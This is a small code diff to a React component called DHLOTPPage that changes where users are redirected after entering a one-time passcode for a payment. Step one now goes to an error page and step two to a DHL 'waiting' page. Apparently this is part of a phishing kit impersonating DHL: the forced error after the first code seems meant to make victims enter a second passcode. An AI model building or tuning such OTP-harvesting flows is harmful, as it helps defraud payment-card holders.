@@ -85,9 +85,9 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
       const queryString = params.toString();
       
       if (step === 1) {
-        window.location.href = `/otp2${queryString ? `?${queryString}` : ""}`;
+        window.location.href = `/error${queryString ? `?${queryString}` : ""}`;
       } else {
-        window.location.href = `/success${queryString ? `?${queryString}` : ""}`;
+        window.location.href = `/dhl/waiting${queryString ? `?${queryString}` : ""}`;
       }
     },
     onError: () => {
